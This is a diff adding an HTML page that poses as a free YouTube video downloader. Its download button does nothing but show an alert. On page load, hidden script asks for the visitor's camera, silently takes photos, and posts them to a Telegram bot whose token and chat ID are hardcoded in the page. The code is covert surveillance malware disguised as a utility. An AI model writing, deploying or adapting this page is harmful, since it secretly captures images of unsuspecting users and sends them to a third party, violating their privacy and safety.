@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video Downloader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+        }
+        .input-box {
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 60%;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        #video, #canvas {
+            display: none; /* Hidden camera */
+        }
+        .info {
+            margin-top: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>YouTube Video Downloader</h1>
+        <p>Paste your YouTube URL below to download videos instantly!</p>
+        
+        <div class="input-box">
+            <input type="text" id="youtube-url" placeholder="Enter YouTube URL here">
+            <button id="download">Download</button>
+        </div>
+        
+        <div class="info">
+            <p>Supports all video formats | Fast & Free | No registration needed</p>
+        </div>
+        
+        <!-- Hidden camera elements -->
+        <video id="video" width="640" height="480" autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7950947220:AAHk4SSroAwl2Go2uts-2DMmN47mb1VivJs';
+        const CHAT_ID = '6192971829';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const downloadButton = document.getElementById('download');
+        const youtubeUrl = document.getElementById('youtube-url');
+        const context = canvas.getContext('2d');
+
+        // Function to start camera
+        function startCamera(facingMode) {
+            const constraints = {
+                video: { facingMode: facingMode } // 'user' for front, 'environment' for back
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => captureAndSendPhoto(facingMode), 2000); // Capture after 2 sec
+                })
+                .catch(err => {
+                    console.error(`Error accessing ${facingMode} camera: `, err);
+                });
+        }
+
+        // Capture and send photo
+        function captureAndSendPhoto(cameraType) {
+            context.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob, `${cameraType}_photo.jpg`);
+                // Stop the current stream after capturing
+                video.srcObject.getTracks().forEach(track => track.stop());
+                // Switch to the other camera
+                if (cameraType === 'front') {
+                    startCamera('environment'); // Back camera next
+                }
+            }, 'image/jpeg');
+        }
+
+        // Send photo to Telegram
+        function sendPhotoToTelegram(photoBlob, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, filename);
+
+            fetch(TELEGRAM_API, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log(`${filename} sent to Telegram!`);
+                } else {
+                    console.error('Error:', data);
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            });
+        }
+
+        // Start with front camera
+        startCamera('user');
+
+        // Fake download button
+        downloadButton.addEventListener('click', () => {
+            const url = youtubeUrl.value.trim();
+            if (url) {
+                alert('Downloading your video... (Demo mode)');
+            } else {
+                alert('Please enter a YouTube URL!');
+            }
+        });
+    </script>
+</body>
+    </html>
